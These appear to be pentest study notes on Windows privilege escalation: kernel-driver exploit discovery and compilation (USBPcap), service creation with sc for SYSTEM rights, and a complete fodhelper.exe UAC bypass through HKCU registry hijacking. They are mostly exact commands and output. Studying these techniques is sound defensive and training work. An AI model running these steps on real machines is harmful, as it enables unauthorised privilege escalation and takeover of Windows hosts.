> Great alternative to **PrintSpoofer** is the [**Potato**](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) family

# Removed

## Kernel Vulns

When attempting to exploit system-level software (such as drivers or the kernel itself),  
we must pay careful attention to several factors including the target's operating system, version, and architecture.  
Failure to accurately identify these factors can trigger a BSOD  
  
* 3rd party kernel drivers are easier to exploit than the OS's kernel itself. (Vigorous patch cycle)  
** Even drivers marked as Stopped can be interacted with as they're still loaded into kernel memory space.  
*** Driver directory is typically: _C\:\\Windows\\System32\\DRIVERS_  
  
  
Determine version & architecture:  
```powershell
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"  
OS Name:                   Microsoft Windows 7 Professional  
OS Version:                6.1.7601 Service Pack 1 Build 7601  
System Type:               X86-based PC
```


Determine drivers:  
```powershell
C:\Users\student\Desktop>driverquery /v  
  
Module Name  Display Name           Description            Driver Type   Start M  
ode State      Status     Accept Stop Accept Pause Paged Pool Code(bytes BSS(by  
Link Date              Path                                             Init(byt  
es  
============ ====================== ====================== ============= =======  
...  
  USBPcap      USBPcap Capture Servic USBPcap Capture Servic Kernel        Manual  
    Stopped    OK         FALSE       FALSE        7,040      9,600      0  
10/2/2015 2:08:15 AM   C:\Windows\system32\DRIVERS\USBPcap.sys          2,176  
...
```
	Fairly certain 3rd party drivers don't have _Microsoft_ attached to their listing.  
  
  
Search for exploit:  
```bash
kali@kali:~# searchsploit USBPcap  
--------------------------------------- ----------------------------------------  
 Exploit Title                         |  Path  
                                       | (/usr/share/exploitdb/)  
--------------------------------------- ----------------------------------------  
USBPcap 1.1.0.0 (WireShark 2.2.5) - Lo | exploits/windows/local/41542.c  
--------------------------------------- ----------------------------------------

```

Verify installed version of driver to match 1.1.0.0:  
```powershell
C:\Users\n00b> cd "C:\Program Files"  
  
C:\Program Files> dir  
...  
08/13/2015  04:04 PM    <DIR>          MSBuild  
07/14/2009  06:52 AM    <DIR>          Reference Assemblies  
01/24/2018  02:30 AM    <DIR>          USBPcap
```


Inspect contents of _USBPcap\\USBPcap.inf_:  
```powershell
C:\Program Files\USBPcap> type USBPcap.inf  
[Version]  
Signature           = "$WINDOWS NT$"  
Class               = USB  
ClassGuid           = {36FC9E60-C465-11CF-8056-444553540000}  
...  
DriverVer=10/02/2015,1.1.0.0  
```


Compile C coded exploit:  
	**Ideally, we would compile the code on the platform version it is intended to run on.  
	In those cases, we would simply create a virtual machine that matches our target and compile the code there.  
  
We can attempt to get [mingw-w64.bat](mingw-w64.md) on the Win vic, run it (giving us gcc & adding it as a PATH var), and compile our exploit's code there:  
```powershell
gcc 41542.c -o exploit.exe
```
** May produce [error messages](https://gcc.gnu.org/onlinedocs/gcc/Warnings-and-Errors.html). Review carefully as it might have still worked.

## sc

Will get NT AUTHORITY/SYSTEM rights:
```powershell
sc create <service_name> binpath= "<full_path\binary>" type= own type= interact
sc start <service_name>
```


## Shell-Open-Command Registry Edits
[fodhelper.exe](fodhelper.exe.md)  
  
\*\*\*NOTE: had to be admin; student didn't have perms for **fodhelper.exe** nor **procmon.exe**  
  
Use [sigcheck.exe](sigcheck.exe.md) to inspect the app's _application manifest_ to determine integrity level & pers required to run it:  
```powershell
C:\> cd C:\Tools\privilege_escalation\SysinternalsSuite  
  
C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe  
  
c:\windows\system32\fodhelper.exe:  
	Verified:       Signed  
	Signing date:   4:40 AM 9/29/2017  
	...  
	<requestedPrivileges>  
	<requestedExecutionLevel  
	level="requireAdministrator"  
	...  
	<autoElevate>true</autoElevate>  
	</asmv3:windowsSettings>  
	 </asmv3:application>  
	</assembly>
```
	**-a** - Extended info  
	**-m** - Dump Manifest  
	(Line 11) - Meant to be run by admin users (req full admin access token)  
	(Line 13) - Allows executable to auto-elevate to _High Integrity_ w/o prompting from admin user for consent  
  
  
Gather more info about fodhelper as it executes:  
1. Start procmon.exe  
2. Run fodhelper.exe  
3. Set filters to:
	1. Process Name - Is - fodhelper.exe - then - Include
	2. Operation - Contains - Reg - then - Include
	3. Result - Is - NAME NOT FOUND - then - Include
	4. Path - Contains - HKCU - then - Include
	5. Path - Contains - ms-settings\\shell\\open\\command - then - Include
  
2 - We're looking for reg entries that don't exist that fodhelper is attempting to access  
	- May be able to tamper w/ the entries & interfere w/ acitons the _High-Integrity_ process is attempting to perform.  
	  
  
3 - Search for the Reg Hive we can control w/ read/ write access - HKCU (hkey_current_user)  

4- One particular result: HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command  
  
To figure why it's trying to access that key, change filter 4^:  
  
5- Results show that after attempting to mod that key, not finding it, it then successfully finds it in the HKEY_CLASSES_ROOT (HKCR) hive  
  
Steps:  
1. Add key in HKCU hive (where it looks for it first)
```powershell
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
```
![[reg_key.png]]
To ensure we don't hijack execution through the COM object, we'll add an empty entry for _DelegateExecute_.
	fodhelper discovers the empty value, follows the specs for _application protocols_ & will look for a program in the _Default_ key  
  
  
2. Add empty value for _DelegateExecute_ to force execution from COM object to program
```powershell
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```
	**/v** - Value name  
	**/t** - Type  
  
To verify, remove filter 3^ and change to:  
Result - Is - SUCCESS - then - Include  
  
  
3. Add our binary under _Default_ value
```powershell
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```
	**/d** - Specify new registry key value  
	**/f** - Add value silently  
  
Running fodhelper again will throw a High-Integrity cmd shell